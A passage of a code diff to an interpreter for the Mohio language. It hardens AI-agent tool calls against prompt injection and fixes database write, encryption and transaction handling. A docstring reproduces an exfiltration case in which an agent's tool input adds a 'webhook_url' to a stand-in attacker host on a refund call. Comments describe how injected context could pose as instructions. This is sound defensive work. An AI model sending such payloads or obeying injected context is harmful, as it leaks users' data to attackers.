-                             and {str(f) for f in fields} & self._encrypted_fields)
+        _tagged_names = set(self.classification.fields_with('encrypted'))
+        fields_tagged = bool(fields and _tagged_names
+                             and {str(f) for f in fields} & _tagged_names)
         table_tagged = table in self._tagged_tables
-        if (getattr(ctx, '_sector_profile', None) is None
+        if (scoped_attr(ctx, '_sector_profile') is None
                 and not fields_tagged and not table_tagged):
             return None
         if fields_tagged:
@@ -8408,8 +11355,37 @@ class MohioInterpreter:
                 if sends:
                     shape_name = sends[3:] if str(sends).startswith('sh.') else str(sends)
                     shape_decl = ctx.get_shape(shape_name) if ctx else None
-                    if shape_decl is not None:
-                        input_schema = self._shape_to_input_schema(shape_decl)
+                    if shape_decl is None:
+                        # A `sends` naming a shape that does not exist USED to fall through to
+                        # the permissive schema. Once the shape became the enforcement, that
+                        # silently disabled enforcement for this tool -- the declaration would
+                        # be present, and mean nothing. Same class as the grant-to-unknown-
+                        # operation refusal above, and caught in the same place.
+                        raise MohioRuntimeError(
+                            f"ai.agent '{node.name}': tools grant '{conn_name}.{op_name}' "
+                            f"declares `sends sh.{shape_name}`, but no shape named "
+                            f"'{shape_name}' is declared. The shape is what limits what the "
+                            f"agent may send, so an unresolvable one would leave the call "
+                            f"unchecked. Declare it with "
+                            f"`shape {shape_name} ... shape: done`.")
+                    input_schema = self._shape_to_input_schema(shape_decl)
+                else:
+                    # NO `sends` IS AN EMPTY ALLOWLIST (ruled 2026-09-01, closing
+                    # T1-AGENT-TOOL-SENDS-REQUIRED). This used to warn and then allow anything,
+                    # which left the Q99 vector open on precisely the operations nobody had
+                    # described -- the least-reviewed ones got the fewest limits, which is
+                    # backwards. An operation that declares nothing now permits nothing.
+                    #
+                    # Still WARNED at setup as well as refused at the call, because the two
+                    # answer different questions: the warning tells the developer at startup
+                    # that a granted tool can currently be sent nothing, before an agent run
+                    # discovers it; the refusal names the fields that were attempted.
+                    print(f"  [ai.agent] WARNING: '{node.name}' is granted "
+                          f"'{conn_name}.{op_name}', which declares no `sends` shape. An "
+                          f"operation that describes nothing permits nothing, so the model "
+                          f"can send NO fields to it and any call carrying one is refused. "
+                          f"Declare `sends sh.<Shape>` on the operation to say what it may "
+                          f"be sent.", file=sys.stderr)
                 tool_name = f"{conn_name}_{op_name}"
                 schemas.append({
                     "name":        tool_name,
@@ -8418,6 +11394,111 @@ class MohioInterpreter:
                 })
                 routing[tool_name] = (conn_name, op_name)
         return schemas, routing
+
+    def _prompt_text(self, value, ctx):
+        """Resolve a goal/persona/context operand to the text that goes in a prompt.
+
+        Two shapes reach here, and they need different handling:
+          * a STRING  -- a literal, possibly carrying `{{ var }}`, so it goes through
+            `_interpolate` exactly as before (which fails loud on an unknown variable).
+          * a NODE    -- `context ticket.body`, kept by the transformer instead of being
+            flattened to "" (Q99). Its value only exists at run time, so it is evaluated here.
+
+        One helper rather than the same two-line check at each consumer, because `ai.agent` and
+        `ai.decide` share the option and drifted apart once already.
+        """
+        if value is None or value == "":
+            return ""
+        if isinstance(value, str):
+            return self._interpolate(value, ctx)
+        resolved = self._eval_simple(value, ctx)
+        if isinstance(resolved, MohioValue):
+            resolved = resolved.to_python()
+        return "" if resolved is None else str(resolved)
+
+    def _tool_input_contract(self, conn_name, op_name, ctx):
+        """The `sends` shape declared on a connector operation, or None.
+
+        None means the operation declares NO input contract, which is why
+        `_agent_tool_schemas` warns about it at setup: without a shape there is
+        nothing to enforce, and the model writes the whole outbound body.
+        """
+        op = (getattr(self, '_connectors', {})
+              .get(conn_name, {}).get('operations', {}).get(op_name) or {})
+        sends = op.get('sends')
+        if not sends:
+            return None
+        shape_name = sends[3:] if str(sends).startswith('sh.') else str(sends)
+        return ctx.get_shape(shape_name) if ctx else None
+
+    def _enforce_tool_input(self, tool_name, shape, tool_input,
+                            conn_name=None, op_name=None):
+        """THE SHAPE IS THE ALLOWLIST, on an agent's outbound tool call too.
+
+        Q99 (2026-09-01). The `sends` shape was used to build the tool's input SCHEMA --
+        which is a hint shown to the model, and nothing more. Whatever the model then
+        produced became the outbound body verbatim. Reproduced before the fix, with a shape
+        declaring only `amount`:
+
+            tool_input {'amount': 1, 'webhook_url': 'https://attacker.example/steal',
+                        'metadata': 'exfiltrated'}
+            OUTBOUND -> https://api.stripe.com/refund
+            BODY     : {"amount": 1, "webhook_url": "https://attacker.example/steal",
+                        "metadata": "exfiltrated"}
+
+        No error, no audit event. This is the mass-assignment class (Q13) on the agent's
+        OUTBOUND side: the declaration looked like a contract and was decoration. Making the
+        existing `sends` shape mean what it already says is the fix -- not a second
+        permitted-list beside it, which the developer would then have to keep in sync.
+
+        WHY REFUSE RATHER THAN STRIP THE EXTRA FIELDS. Silently dropping them would stop the
+        exfiltration and hide that it was attempted, which is a silent failure by the
+        project's own definition, and on the one path where a hidden event matters most: a
+        model asking for a field it was never offered is the visible signature of a prompt
+        injection. So it is refused and audited, the SAME shape as an ungranted tool NAME --
+        the boundary already treats the name that way, and input is the other half of the
+        same boundary.
+
+        Returns None when the call may proceed, or a refusal string.
+        """
+        if not isinstance(tool_input, dict):
+            return (f"tool '{tool_name}' was called with {type(tool_input).__name__}, not a "
+                    f"set of named fields")
+
+        # An operation with NO `sends` shape declares an EMPTY allowlist. It permits nothing,
+        # rather than permitting everything. The message has to say how to allow, because a
+        # refusal a developer cannot act on just moves the confusion.
+        if shape is None:
+            if not tool_input:
+                return None
+            _op = f"{conn_name}.{op_name}" if conn_name and op_name else "this operation"
+            return (f"tool '{tool_name}' was called with "
+                    f"{', '.join(repr(k) for k in sorted(tool_input))}, but `{_op}` declares no "
+                    f"`sends` shape, so it accepts no fields at all. An operation that "
+                    f"describes nothing permits nothing -- otherwise the operations nobody "
+                    f"described would be the only ones with no limit. Declare what it may be "
+                    f"sent:  `sends sh.<Shape>` on the operation, with a `shape` naming those "
+                    f"fields.")
+
+        declared = []
+        for f in (getattr(shape, 'fields', None) or []):
+            p = self._shape_field_props(f)
+            if p.get('name'):
+                declared.append(p['name'])
+        undeclared = sorted(set(tool_input) - set(declared))
+        if undeclared:
+            return (f"tool '{tool_name}' was called with "
+                    f"{', '.join(repr(u) for u in undeclared)}, which the `sends` shape does "
+                    f"not declare. Declared fields: "
+                    f"{', '.join(declared) if declared else '(none)'}")
+        # Same validator a form runs, so the agent boundary enforces the SAME declared
+        # constraints -- required, allowed-values, email, number -- rather than a second
+        # implementation of them that would drift from the first.
+        errors = self._validate_against_shape(shape, lambda n: tool_input.get(n))
+        if errors:
+            return (f"tool '{tool_name}' input does not satisfy the `sends` shape: "
+                    + "; ".join(f"{k}: {v}" for k, v in errors.items()))
+        return None
 
     def _exec_AiAgentBlock(self, node, ctx):
         """
@@ -8472,17 +11553,40 @@ class MohioInterpreter:
         accumulated_cost = 0.0
         start_time      = _time.monotonic()
 
-        goal    = node.goal    or ""
-        context = node.context or ""
+        goal    = self._prompt_text(node.goal, ctx)
+        context = self._prompt_text(node.context, ctx)
         from mohio_ai import DEFAULT_ANTHROPIC_MODEL
         model   = node.model   or DEFAULT_ANTHROPIC_MODEL
 
-        # Build initial message
+        # INSTRUCTION AND DATA ARE SEPARATED (Q99 Fix C, 2026-09-01).
+        #
+        # These used to be concatenated into ONE user-role message:
+        #     messages[0]["content"] = goal + "\n\nContext: " + context
+        # so the goal (which the developer wrote, and trusts) and the context (which can carry
+        # whatever the data carries) arrived as one undifferentiated block. Nothing in the
+        # prompt said which half was the instruction, so a line inside the context reading like
+        # an instruction sat at exactly the same level as the real one.
+        #
+        # It was INERT only because a dotted context was being discarded before it got here --
+        # a bug, not a boundary. Wiring that (Fix B, above) is what makes this necessary, which
+        # is why the two land together: turning the context on without the separation would
+        # have switched the vector on.
+        #
+        # The split mirrors `ai.decide`, which already does this correctly and is the reference
+        # rather than a scheme invented here: the INSTRUCTION goes in the system role, and the
+        # data goes in the user turn under an "Additional context:" label (mohio_ai.py's
+        # decide(): `user = f"Additional context:\n{context}\n\n{user}"`).
+        #
+        # With no context there is no untrusted half to separate from, so the goal stays as the
+        # user turn exactly as before -- the boundary appears precisely when there are two
+        # things to put on opposite sides of it.
+        system_prompt = goal or None
         messages = []
-        if goal:
-            messages.append({"role": "user", "content": goal})
         if context:
-            messages[0]["content"] = messages[0]["content"] + "\n\nContext: " + str(context)
+            messages.append({"role": "user",
+                             "content": "Additional context:\n" + str(context)})
+        elif goal:
+            messages.append({"role": "user", "content": goal})
 
         result = None
         agent_error = None
@@ -8588,6 +11692,7 @@ class MohioInterpreter:
                         from types import SimpleNamespace as _NS
                         turn = self.ai.agent_turn(
                             messages=messages, tools=tool_schemas, model=model,
+                            system=system_prompt,
                             temperature=float(self._eval_simple(node.temperature, ctx) or 0.7)
                                 if node.temperature else 0.7,
                             max_tokens=(max_tokens or None),
@@ -8622,6 +11727,37 @@ class MohioInterpreter:
                         # budget -> _AgentLimitExceeded, handled below). The carrier
                         # is a minimal stand-in for a MioconnectCall node.
                         conn_name, op_name = tool_routing[turn.tool_name]
+
+                        # The tool NAME was granted. Its INPUT is the other half of the same
+                        # boundary, and it was unguarded: the `sends` shape only ever built
+                        # the schema shown to the model, so whatever the model produced became
+                        # the outbound body. Refused and audited here, the same shape as an
+                        # ungranted name, because a model asking for a field it was never
+                        # offered is the visible signature of a prompt injection -- stripping
+                        # the field would stop the exfiltration and hide the attempt.
+                        # NO `sends` IS AN EMPTY ALLOWLIST, not an absent one (ruled
+                        # 2026-09-01). It used to mean "no contract, so send anything", which
+                        # left the Q99 vector wide open on exactly the operations nobody had
+                        # bothered to describe -- the least-reviewed ones. An operation that
+                        # declares nothing permits nothing: the same rule as everywhere else,
+                        # read the only way that is safe when the declaration is missing.
+                        _sends_shape = self._tool_input_contract(conn_name, op_name, ctx)
+                        _refusal = self._enforce_tool_input(
+                            turn.tool_name, _sends_shape, turn.tool_input or {},
+                            conn_name=conn_name, op_name=op_name)
+                        if _refusal:
+                            self._audit_logs.setdefault(f"{node.name}_limits_log", []).append(
+                                self._audit_event(f"{node.name}_limits_log", {
+                                    "event":      "TOOL_INPUT_REFUSED",
+                                    "agent":      node.name,
+                                    "tool":       turn.tool_name,
+                                    "detail":     _refusal,
+                                    "error_name": "tool_input_refused",
+                                }, ctx))
+                            agent_error = (f"tool_input_refused: agent '{node.name}': "
+                                           f"{_refusal}")
+                            break
+
                         _call = _NS(connector=conn_name, operation=op_name,
                                     payload=MohioValue(turn.tool_input or {}, 'shape'),
                                     result=None)
@@ -8650,12 +11786,21 @@ class MohioInterpreter:
                     # decide()'s own chain/app-default resolution, not force the dated
                     # local default (`model` at the top of this method) in as a fake
                     # "explicit" override that would now outrank an active chain.
+                    # `system_prompt=goal` -- 2026-09-01, found while building Fix C. This
+                    # call never passed the goal at ALL, so a no-tools ai.agent reached the
+                    # model with no instruction: `decide` built its prompt from the decision
+                    # NAME and an empty `inputs`, and the developer's `goal "..."` went
+                    # nowhere. The tool-enabled sibling path had it (it went into the message
+                    # content), so the two paths disagreed about whether an agent has a goal.
+                    # It also lands the same separation on this path: decide() puts
+                    # system_prompt in the system role and context in the user prompt.
                     response = self.ai.decide(
                         name=node.name,
                         inputs={},
                         threshold=0.0,
                         return_type='text',
                         context=context,
+                        **({'system_prompt': goal} if goal else {}),
                         temperature=float(self._eval_simple(node.temperature, ctx) or 0.7)
                             if node.temperature else 0.7,
                         **({'model_override': node.model} if node.model else {}),
@@ -8792,7 +11937,7 @@ class MohioInterpreter:
             self._refuse_held_source_query(node.source, ctx, 'grab')
             db, _early = self._db_or_fail(ctx, 'grab', node)
             if db is None: return _early
-            table = self._resolve_source(node.source, ctx)
+            table, _src_col = self._resolve_source_parts(node.source, ctx)
         else:
             db = None
             table = None
@@ -8825,9 +11970,12 @@ class MohioInterpreter:
                 if len(match_clauses) == 1:
                     mc = match_clauses[0]
                     match_val = self._eval_simple(mc.value, ctx)
-                    row = db.retrieve_one(table, mc.field, match_val)
+                    # BLIND INDEX: an encrypted field matches through its shadow column.
+                    _f, match_val = self._bidx_pair(db, table, mc.field, match_val, node)
+                    row = db.retrieve_one(table, _f, match_val)
                 else:
                     conditions = {mc.field: self._eval_simple(mc.value, ctx) for mc in match_clauses}
+                    conditions = self._bidx_dict(db, table, conditions, node)
                     row = db.retrieve_one_multi(table, conditions)
             except Exception as e:
                 return self._handle_failure(node.handlers, ctx, str(e), operational_failure=True)
@@ -8847,6 +11995,11 @@ class MohioInterpreter:
             # null and run the normal success path so when/otherwise actually evaluate,
             # instead of the prior silent "neither fires" gap.
             return _bind_and_succeed(MohioValue(None, 'null'))
+        # T1-DOTTED-SOURCE-COLUMN: `grab u from db.users.email` binds the EMAIL, not the
+        # whole row -- the column narrows what is fetched. A row without that column binds
+        # empty rather than handing back the row it was not asked for.
+        if _src_col:
+            return _bind_and_succeed(MohioValue(row.get(_src_col) if isinstance(row, dict) else None))
         return _bind_and_succeed(MohioValue(row, 'shape'))
 
     def _exec_GetBlock(self, node, ctx):
@@ -8862,9 +12015,31 @@ class MohioInterpreter:
         items, never an error. Result binds to the closer's `as` name.
         """
         import random as _random
-        from mohio_ast import DbRef, DottedName
+        from mohio_ast import (DbRef, DottedName, MatchClause, WhereClause, AndClause,
+                               MatchBlock, MatchAnyBlock, NoMatchBlock)
         n = int(self._eval_simple(node.limit, ctx)) if node.limit is not None else None
         is_random = getattr(node, 'random', False)
+
+        # T1-PULL-FILTER-UNBUILT (2026-08-24): this executor has never read node.body. It issues
+        # `db.find_many(table, limit=n)` with no WHERE, and slices a non-db source whole, so a
+        # `match`/`where` written on a pull was silently discarded -- not the composite-pair bug
+        # fixed alongside this, but a filter that was never applied at all: a SINGLE-pair match
+        # was dropped too. `pull p up to 10 from db.items / match location to "hall"` returned
+        # every row in the table. Handing back an unfiltered table to a program that asked for a
+        # filtered one is silent wrong data, so refuse rather than answer wrongly. Deferral, with
+        # its backlog entry (`T1-PULL-FILTER-UNBUILT`) -- the grammar still accepts the form.
+        _filters = [b for b in (node.body or [])
+                    if isinstance(b, (MatchClause, WhereClause, AndClause,
+                                      MatchBlock, MatchAnyBlock, NoMatchBlock))]
+        if _filters:
+            raise MohioRuntimeError(
+                "pull: filtering a pull with `match`/`where` is declared but not yet built -- "
+                "the runtime fetches the rows unfiltered, so returning them would hand back the "
+                "WHOLE table as though it were the filtered result. Use `find`, which applies "
+                "the filter, or drop the filter to take the first N rows. (This used to also "
+                "name `retrieve`; retrieve applies `match` but refuses `where` -- see "
+                "T1-RETRIEVE-CLAUSE-UNBUILT -- so pointing at it for a `where` would send the "
+                "reader from one refusal straight into another.)")
 
         is_db = isinstance(node.source, DbRef) or (
             isinstance(node.source, DottedName)
@@ -8882,9 +12057,16 @@ class MohioInterpreter:
             # nothing there". Fail loud.
             db, _early = self._db_or_fail(ctx, 'pull', node)
             if db is None: return _early
-            table = self._resolve_source(node.source, ctx)
+            table, _src_col = self._resolve_source_parts(node.source, ctx)
             rows  = db.find_many(table, limit=n)
-            result = MohioValue(rows, 'list')
+            # Decrypt on the way out -- the same call `find`/`retrieve`/`grab` make. `pull` has
+            # its own read branch, so it was missed when the bulk read verbs were fixed: it
+            # returned raw `enc:v1:...` for a `[pii]` field and, worse, `****ZaQ=` for a `[pci]`
+            # one -- the mask running over base64 ciphertext, which reads like a correctly
+            # masked card and is not.
+            rows = [self._decrypt_row(r) if isinstance(r, dict) else r for r in rows]
+            # T1-DOTTED-SOURCE-COLUMN: a column narrows what is pulled to those values.
+            result = MohioValue(self._project_column(rows, _src_col), 'list')
             _pull_source_name = table
         else:
             # Random, or a non-db source (held list / find-result): resolve the
@@ -8936,7 +12118,7 @@ class MohioInterpreter:
             if not ctx.exists(nm):
                 raise MohioRuntimeError(
                     f"{where} refers to an unknown variable '{nm}'. Declare it first "
-                    f"(e.g. `hold {nm} <value>`), or check the spelling.")
+                    f"(e.g. `{nm} <value>`), or check the spelling.")
 
     def _resolve_dynamic_field_name(self, field_name_node, ctx, verb):
         """Resolve a dynamic `name to value` field's COLUMN NAME at runtime, failing loud on
@@ -8952,7 +12134,7 @@ class MohioInterpreter:
             raise MohioRuntimeError(
                 f"{verb}: the dynamic field name resolved to empty, so there is no column to "
                 f"write. A dynamic field name must resolve to a real column name "
-                f"(e.g. `hold column \"amount\"` then `column to 42`).")
+                f"(e.g. `column \"amount\"` then `column to 42`).")
         return name
 
     def _exec_SaveBlock(self, node, ctx):
@@ -8972,7 +12154,7 @@ class MohioInterpreter:
                 "real database and `save to db.<table>` to write rows today.")
         db, _early = self._db_or_fail(ctx, 'save', node)
         if db is None: return _early
-        table = self._resolve_source(node.target, ctx)
+        table = self._resolve_write_target(node.target, ctx, 'save')
 
         from mohio_ast import DynamicFieldValue
         fields = {}
@@ -9024,9 +12206,15 @@ class MohioInterpreter:
             # of asking the shared retrieve functions to guess which caller they're serving;
             # anything else propagates.
             try:
-                existing = (db.retrieve_one_multi(table, conditions)
+                # BLIND INDEX: the dedupe lookup matches an encrypted key through its shadow
+                # column, so `save or update ... match ssn to X` finds the existing row rather
+                # than inserting a duplicate every time.
+                _bx_conditions = self._bidx_dict(db, table, conditions, node)
+                _bx_f, _bx_v = self._bidx_pair(db, table, dedupe_fields[0],
+                                               fields[dedupe_fields[0]], node)
+                existing = (db.retrieve_one_multi(table, _bx_conditions)
                             if len(conditions) > 1
-                            else db.retrieve_one(table, dedupe_fields[0], fields[dedupe_fields[0]]))
+                            else db.retrieve_one(table, _bx_f, _bx_v))
             except Exception as e:
                 _backend = type(db).__name__
                 _missing_table = (
@@ -9051,8 +12239,8 @@ class MohioInterpreter:
             # bare insert, so a concurrent writer between the check above and the write here
             # cannot produce a duplicate. The pre-check above stays because it is what returns
             # the EXISTING record (and runs on.success) when one is already there.
+            fields = self._guard_write(table, fields, node, 'save')
             try:
-                fields = self._encrypt_fields_for_write(fields, node)
                 row_id = db.save_if_not_exists(table, fields, dedupe_fields)
             except Exception as e:
                 if any(isinstance(h, OnFailure) for h in node.handlers):
@@ -9072,8 +12260,8 @@ class MohioInterpreter:
             self._handle_success(node.handlers, ctx)
             return result
 
+        fields = self._guard_write(table, fields, node, 'save')
         try:
-            fields = self._encrypt_fields_for_write(fields, node)
             row_id = db.save(table, fields)
         except Exception as e:
             if any(isinstance(h, OnFailure) for h in node.handlers):
@@ -9119,7 +12307,7 @@ class MohioInterpreter:
                 "Connect a real database and `save or update db.<table>` to write rows today.")
         db, _early = self._db_or_fail(ctx, 'save or update', node)
         if db is None: return _early
-        table = self._resolve_source(node.source, ctx)
+        table = self._resolve_write_target(node.source, ctx, 'upsert')
 
         # Collect field values
         from mohio_ast import DynamicFieldValue
@@ -9160,7 +12348,7 @@ class MohioInterpreter:
         # upsert skipped this entirely, so a [phi]/[pii]/[pci] field written via upsert went
         # in as plaintext. Encryption is idempotent (it no-ops on an already-`enc:v1:` value),
         # so the update-then-save fallback path re-calling it is harmless.
-        fields = self._encrypt_fields_for_write(fields, node)
+        fields = self._guard_write(table, fields, node, 'save or update')
 
         # Native upsert if available -- pass the FULL list of conflict columns.
         if match_fields and hasattr(db, 'upsert'):
@@ -9212,15 +12400,30 @@ class MohioInterpreter:
                 "wanted, NOT YET BUILT work, tracked as the T1-QUERY-HELD follow-on. Connect a "
                 "real database and `save all to db.<table>` to write rows today.")
         db    = ctx.get_connection('db')
-        table = self._resolve_source(node.target, ctx)
+        table = self._resolve_write_target(node.target, ctx, 'save all')
         if not db:
             raise _Raise(error_name='db_error',
                          message="save all: no database connection is open")
         self._require_defined(node.source, ctx, "save all source")  # A3.1
         coll  = self._eval(node.source, ctx)
+        # What the source's shape allows, if it came from a shaped handler binding.
+        _src_allowed = getattr(coll, 'shape_fields', None)
+        _src_shape = getattr(coll, 'shape_name', None)
         items = coll.to_python() if isinstance(coll, MohioValue) else coll
         if items is None:
-            items = []
+            # A null source is NOT an empty batch. Coercing it to [] wrote nothing, audited
+            # `count=0`, and still ran `on.success` -- the program said "save all of these"
+            # while holding nothing, and was told it worked. Same shape as an `update` with no
+            # condition (refused just above): the operation is structurally impossible, not
+            # merely empty. A genuinely EMPTY list is different and still succeeds, because
+            # that batch really was built and really did run over zero rows -- the same
+            # distinction `remove` draws when its condition matches nothing.
+            raise _Raise(error_name='save_all_source_missing',
+                message=("save all has no collection to save -- its source is empty/undefined, "
+                         "which is not the same as an empty list."),
+                line=getattr(node, 'line', None),
+                hint="Check the name after `from`. If it comes from a `grab`/`find` that may "
+                     "miss, handle the miss first, or build an empty list deliberately.")
         if isinstance(items, dict):
             items = [items]                      # a single record = a 1-item batch
         if not isinstance(items, (list, tuple)):
@@ -9242,7 +12445,8 @@ class MohioInterpreter:
                     fields[k] = v
                 # Encrypt tagged fields before persisting, same as singular save. Without
                 # this, a batch write of [phi]/[pii]/[pci] records stored them in the clear.
-                fields = self._encrypt_fields_for_write(fields, node)
+                fields = self._guard_write(table, fields, node, 'save all',
+                                           allowed=_src_allowed, shape_name=_src_shape)
                 saved_ids.append(db.save(table, fields))
         except _Raise:
             raise
@@ -9271,7 +12475,7 @@ class MohioInterpreter:
                 "update rows today.")
         db, _early = self._db_or_fail(ctx, 'update', node)
         if db is None: return _early
-        table = self._resolve_source(node.source, ctx)
+        table = self._resolve_write_target(node.source, ctx, 'update')
 
         from mohio_ast import DynamicFieldValue
         matches = [b for b in node.body if isinstance(b, MatchClause)]
@@ -9302,33 +12506,65 @@ class MohioInterpreter:
                 if self.verbose:
                     print(f"  [set field] dynamic: {field_name_str!r} = {value_py!r}")
 
-        if matches and updates:
-            conditions = {m.field: self._eval_simple(m.value, ctx) for m in matches}
-            # Encrypt tagged fields BEFORE the write. `save` did this; update did not, so a
-            # [phi]/[pii]/[pci] field first written via `update` went to the database as
-            # plaintext and the fail-loud never fired (the encrypt path was never entered).
-            # Same chokepoint, same fail-loud, now on this path too.
-            updates = self._encrypt_fields_for_write(updates, node)
-            try:
-                count = db.update_multi(table, updates, conditions)
-            except Exception as e:
-                if any(isinstance(h, OnFailure) for h in node.handlers):
-                    # T0-4/FORK-8: see the identical comment on save's error path.
-                    if getattr(db, '_in_transaction', False):
-                        self._transaction_write_failed = True
-                    return self._handle_failure(node.handlers, ctx, str(e))
-                raise _Raise(error_name='db_error', message=str(e))
-            # T1-AUDIT-COMPOSITE-KEY-IDENTITY, Finding C (ruled 2026-08-21): a mutation must be
-            # as identifiable as an insert -- "which row was updated" is a core audit question.
-            # The match CONDITIONS are what selected the row, so they are the identity values;
-            # tagged columns are redacted by the renderer exactly as they are for save. An
-            # identity column absent from the match renders `<absent>`, which is the honest
-            # answer: the operation was not narrowed by it, and `count` says how many it hit.
-            self._audit_data_change('update', table, ctx,
-                                    match_fields=list(conditions.keys()),
-                                    fields=list(updates.keys()), count=count,
-                                    values=conditions)
-            if self.verbose: print(f"  [update] {table} — {count} rows")
+        # A structurally impossible update must REFUSE, never report success. `remove` has
+        # refused a condition-less delete since it was written (`remove_without_condition` --
+        # "so it can't delete the whole table by accident"); `update` never got the equivalent,
+        # so `update db.accounts / balance "999"` with no match line skipped the write, skipped
+        # the audit, and still ran `on.success` -- telling the program a change happened that
+        # never did. The invariant restored here is that the success handler only fires when the
+        # operation actually RAN.
+        #
+        # Deliberately NOT changed: an update whose condition matches zero rows still fires
+        # success, because that operation did run and `remove` behaves the same way (it calls
+        # _handle_success after a delete regardless of count). Success means "the operation
+        # ran", not "rows changed", and update now matches remove on both halves of that.
+        if not matches:
+            raise _Raise(error_name='update_without_condition',
+                message="update needs a condition so it can't rewrite the whole table by accident.",
+                line=getattr(node, 'line', None),
+                hint="Add 'match <field> to <value>' (or 'where <field> is <value>') naming the "
+                     "row(s) to change.")
+        if not updates:
+            raise _Raise(error_name='update_without_fields',
+                message="update names no field to change, so there is nothing to write.",
+                line=getattr(node, 'line', None),
+                hint="Add at least one `field value` line, e.g. `balance 200`.")
+        conditions = {m.field: self._eval_simple(m.value, ctx) for m in matches}
+        # BLIND INDEX: match an encrypted field through its shadow column, so `update ...
+        # match ssn to "1111"` addresses the right row instead of silently matching none.
+        # `conditions` itself is left ALONE -- the audit below records it, and a compliance
+        # record must name the field the operator matched on, not the internal index column.
+        _bx_conditions = self._bidx_dict(db, table, conditions, node)
+        # Encrypt tagged fields BEFORE the write. `save` did this; update did not, so a
+        # [phi]/[pii]/[pci] field first written via `update` went to the database as
+        # plaintext and the fail-loud never fired (the encrypt path was never entered).
+        # Same chokepoint, same fail-loud, now on this path too.
+        updates = self._guard_write(table, updates, node, 'update')
+        # BUILD NOTE 2: `update_multi` does NOT call ensure_table (only `save` does), so the
+        # `__bidx` shadow column would not exist on a table only ever written through update.
+        # Creating it here is idempotent and keeps the index complete for every write verb.
+        try: db.ensure_table(table, list(updates.keys()))
+        except Exception: pass
+        try:
+            count = db.update_multi(table, updates, _bx_conditions)
+        except Exception as e:
+            if any(isinstance(h, OnFailure) for h in node.handlers):
+                # T0-4/FORK-8: see the identical comment on save's error path.
+                if getattr(db, '_in_transaction', False):
+                    self._transaction_write_failed = True
+                return self._handle_failure(node.handlers, ctx, str(e))
+            raise _Raise(error_name='db_error', message=str(e))
+        # T1-AUDIT-COMPOSITE-KEY-IDENTITY, Finding C (ruled 2026-08-21): a mutation must be
+        # as identifiable as an insert -- "which row was updated" is a core audit question.
+        # The match CONDITIONS are what selected the row, so they are the identity values;
+        # tagged columns are redacted by the renderer exactly as they are for save. An
+        # identity column absent from the match renders `<absent>`, which is the honest
+        # answer: the operation was not narrowed by it, and `count` says how many it hit.
+        self._audit_data_change('update', table, ctx,
+                                match_fields=list(conditions.keys()),
+                                fields=list(updates.keys()), count=count,
+                                values=conditions)
+        if self.verbose: print(f"  [update] {table} — {count} rows")
 
         self._handle_success(node.handlers, ctx)
         return None
@@ -9347,7 +12583,7 @@ class MohioInterpreter:
                 "remove rows today.")
         db, _early = self._db_or_fail(ctx, 'remove', node)
         if db is None: return _early
-        table = self._resolve_source(node.source, ctx)
+        table = self._resolve_write_target(node.source, ctx, 'remove')
 
         cond = node.condition
         if not cond:
@@ -9366,8 +12602,11 @@ class MohioInterpreter:
             # the single-field path below.
             conditions = {str(mc.field).split('.')[-1]: self._eval_simple(mc.value, ctx)
                           for mc in cond}
+            # BLIND INDEX on the composite-match delete too. `conditions` is left alone for
+            # the audit below (it must name the operator's fields, not the index columns).
+            _bx_conditions = self._bidx_dict(db, table, conditions, node)
             try:
-                count = db.remove_multi(table, conditions)
+                count = db.remove_multi(table, _bx_conditions)
             except Exception as e:
                 if any(isinstance(h, OnFailure) for h in node.handlers):
                     # T0-4/FORK-8: see the identical comment on save's error path.
@@ -9395,8 +12634,14 @@ class MohioInterpreter:
 
         field = str(cond.field).split('.')[-1]
         match_val = self._eval_simple(cond.value, ctx)
+        # BLIND INDEX: `remove ... where ssn is "1111"` on an encrypted field deleted nothing
+        # and reported success. Route the equality through the shadow column -- but keep the
+        # ORIGINAL field name and value for the audit below. The compliance record must say
+        # which field the operator matched on ("ssn"), never the runtime's internal index
+        # column ("ssn__bidx"), which would name something the program never wrote.
+        _bx_field, _bx_val = self._bidx_pair(db, table, field, match_val, node)
         try:
-            count = db.remove(table, field, match_val)
+            count = db.remove(table, _bx_field, _bx_val)
         except Exception as e:
             if any(isinstance(h, OnFailure) for h in node.handlers):
                 # T0-4/FORK-8: see the identical comment on save's error path.
@@ -9415,7 +12660,7 @@ class MohioInterpreter:
 
     def _exec_RemoveAllBlock(self, node, ctx):
         db    = ctx.get_connection('db')
-        table = self._resolve_source(node.source, ctx)
+        table = self._resolve_write_target(node.source, ctx, 'remove all')
         if not db:
             raise _Raise(error_name='remove_all_no_db',
                 message="remove.all needs a database connection but none is open.",
@@ -9467,6 +12712,32 @@ class MohioInterpreter:
                     "regardless of a caught failure inside it.")
             db.commit_transaction()
             return result
+        except _GiveBack:
+            # A HANDLER UNWIND IS NOT A FAILURE. `give back` inside a transaction raises to
+            # unwind the handler, so it landed in the `except Exception` below: the block rolled
+            # back and then the give-back carried on out and answered the client. Measured over
+            # real HTTP -- POST returned `201 "placed"` while `select * from orders` returned
+            # `[]`. The client was told it worked, a manual test passes, and nothing was saved.
+            # That is the worst shape a bug can take, so the invariant here is absolute: a
+            # response must never report success for a write that did not happen.
+            #
+            # COMMIT-THEN-RESPOND, rather than refusing give-back inside a transaction. Reading
+            # both by running: `give back` at the end of a transaction is the obvious way to
+            # write "do all this, then tell the caller it worked", and refusing it would push
+            # every author into moving the line below `transaction: done` for reasons the
+            # language never explains. Committing first makes the obvious spelling correct.
+            if self._transaction_write_failed:
+                # THE COMMIT CANNOT HAPPEN, so the give-back must not report success. The write
+                # failure is raised in its place -- the caller gets the real outcome, never a
+                # cheerful status over an empty table.
+                db.rollback_transaction()
+                raise MohioRuntimeError(
+                    "a write inside this transaction failed, so the `give back` in it cannot "
+                    "report success -- the whole block rolled back, completed writes included. "
+                    "A response must never say the work was done when the transaction did not "
+                    "commit.")
+            db.commit_transaction()
+            raise
         except Exception:
             db.rollback_transaction()
             raise
@@ -9478,7 +12749,7 @@ class MohioInterpreter:
         # boolean (signup polarity: unique == value not already present). These are
         # non-retrieving -- they answer a question, never return rows. For the row,
         # use find / get.
-        table = self._resolve_source(node.source, ctx)
+        table, _col = self._resolve_source_parts(node.source, ctx)
         if node.variant == 'unique':
             # T1-OUTCOME-STRUCTURE (ruled 2026-08-11): a missing/broken connection is an
             # OPERATIONAL failure -- route to on.failure like every other verb block
@@ -9527,7 +12798,15 @@ class MohioInterpreter:
         # (its own pre-existing policy, unchanged here) -- route that through on.failure/
         # fail loud exactly like retrieve/find/grab now do, instead of an uncaught exception.
         try:
-            cnt = db.count(table, where or None)
+            # T1-DOTTED-SOURCE-COLUMN: `check count as n in db.users.email` counts the EMAILS
+            # in users, not the rows -- the column the coder wrote narrows what is counted.
